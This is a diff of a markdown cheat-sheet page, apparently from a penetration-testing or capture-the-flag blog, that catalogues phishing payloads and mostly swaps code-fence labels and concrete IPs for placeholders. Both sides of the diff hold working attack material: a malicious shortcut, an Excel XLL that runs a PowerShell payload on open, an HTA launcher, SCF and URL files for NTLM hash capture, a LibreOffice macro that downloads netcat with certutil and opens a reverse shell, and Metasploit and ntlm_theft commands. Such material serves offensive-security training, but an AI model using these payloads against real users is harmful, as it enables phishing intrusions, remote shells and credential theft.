@@ -4,7 +4,6 @@ date: 2024-6-26
 tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows", "odt", "libre", "vba", "ntlm_theft"]
 ---
 
----
 {{< tab set1 tab1 active >}}lnk{{< /tab >}}
 {{< tab set1 tab2 >}}xll{{< /tab >}}
 {{< tab set1 tab3 >}}hta{{< /tab >}}
@@ -16,19 +15,19 @@ tags: ["phishing", "email", "xll", "excel", "hta", "shortcut", "Windows", "odt",
 
 <div>
 
-```powershell
+```console
 $obj = New-Object -ComObject WScript.Shell
 ```
 
-```powershell
+```console
 $link = $obj.CreateShortcut("C:\ProgramData\Calculator.lnk")
 ```
 
-```powershell
+```console
 $link.TargetPath = "C:\ProgramData\rev.exe"
 ```
 
-```powershell
+```console
 $link.Save()
 ```
 
@@ -41,14 +40,14 @@ $link.Save()
 
 <div>
 
-```c
+```console
 #include <windows.h>
 
 __declspec(dllexport) void __cdecl xlAutoOpen(void); 
 
 void __cdecl xlAutoOpen() {
     // Triggers when Excel opens
-    WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload
+    WinExec("<POWERSHELL_3_BASE64>", 1); // Replace your payload
 }
 
 BOOL APIENTRY DllMain( HMODULE hModule,
@@ -74,7 +73,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 <div>
 
-```bash
+```console
 x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
 ```
 
@@ -84,8 +83,8 @@ x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
 
 <div>
 
-```bash
-swaks --to "victim@victim.com" --from "attacker@attacker.com" --server "victim.com" --header "This is not a malicious file" --body "This is not a malicious file" --attach '@shell.xll'
+```console
+swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header "This is not a malicious file" --body "This is not a malicious file" --attach '@shell.xll'
 ```
 
 </div>
@@ -99,7 +98,7 @@ swaks --to "victim@victim.com" --from "attacker@attacker.com" --server "victim.c
 
 <div>
 
-```bash
+```console
 # In our local Linux machine
 impacket-smbserver -smb2support share .
 ```
@@ -110,12 +109,12 @@ impacket-smbserver -smb2support share .
 
 <div>
 
-```html
+```console
 <html>
     <head>
         <HTA:APPLICATION ID="shell">
         <script language="javascript">
-            var c = "<PowerShell #3 Base64 Payload>";  
+            var c = "<POWERSHELL_3_BASE64>";  
             new ActiveXObject('WScript.Shell').Run(c, 0, true); 
         </script>
     </head>
@@ -131,20 +130,20 @@ impacket-smbserver -smb2support share .
 
 <div>
 
-```powershell
+```console
 # In target Windows machine (powershell)
-$url = "file://10.10.14.10/share/shell.hta"
+$url = "file://<LOCAL_IP>/share/shell.hta"
 ```
 
-```powershell
+```console
 $shortcutPath = "C:\ProgramData\shell.url"
 ```
 
-```powershell
+```console
 $shortcutContent = "[InternetShortcut]`r`nURL=$url"
 ```
 
-```powershell
+```console
 Set-Content -Path $shortcutPath -Value $shortcutContent
 ```
 
@@ -161,7 +160,7 @@ Set-Content -Path $shortcutPath -Value $shortcutContent
 
 <div>
 
-```bash
+```console
 # In our local Linux machine
 sudo responder -I tun0
 ```
@@ -172,11 +171,11 @@ sudo responder -I tun0
 
 <div>
 
-```evil.scf
+```console
 [Shell]
 Command=2
 
-IconFile=\\10.10.14.10\icon
+IconFile=\\<LOCAL_IP>\icon
 ```
 
 </div>
@@ -185,12 +184,12 @@ IconFile=\\10.10.14.10\icon
 
 <div>
 
-```bash
+```console
 # In our local Linux machine
-smbclient -N \\\\10.10.11.10\\share\\
+smbclient -N \\\\<TARGET>\\share\\
 ```
 
-```bash
+```console
 mput evil.scf
 ```
 
@@ -201,7 +200,7 @@ mput evil.scf
 
 <div>
 
-```
+```console
 +--------------------------------------------------------+
 | 1. "Tools" > "Macros" > "Organize Macros" > "Basic..." |
 | 2. "Untitled 1" > "Standard" > "New"                   |
@@ -215,9 +214,9 @@ mput evil.scf
 
 <div>
 
-```bash
+```console
 Sub OnLoad
-    shell("cmd /c certutil -urlcache -split -f http://10.10.14.10/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd 10.10.14.10 443")
+    shell("cmd /c certutil -urlcache -split -f http://<LOCAL_IP>/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd <LOCAL_IP> <LOCAL_PORT>")
 End Sub
 ```
 
@@ -227,7 +226,7 @@ End Sub
 
 <div>
 
-```
+```console
 +-----------------------------------------------------------+
 | 4. "Tools" > "Organize Macros" > "Basic..." > "Assign..." |
 | 5. "Events" > "Open Document" > "OK"                      |
@@ -242,23 +241,23 @@ End Sub
 
 <div>
 
-```bash
+```console
 msfconsole -q
 ```
 
-```bash
+```console
 search badpdf
 ```
 
-```bash
+```console
 set filename evil.pdf
 ```
 
-```bash
-set lhost 10.10.14.10
+```console
+set lhost <LOCAL_IP>
 ```
 
-```bash
+```console
 exploit
 ```
 
@@ -269,8 +268,8 @@ exploit
 
 <div>
 
-```bash
-python3 ntlm_theft.py -g all -s 10.10.14.10 -f test
+```console
+python3 ntlm_theft.py -g all -s <LOCAL_IP> -f test
 ```
 
 </div>
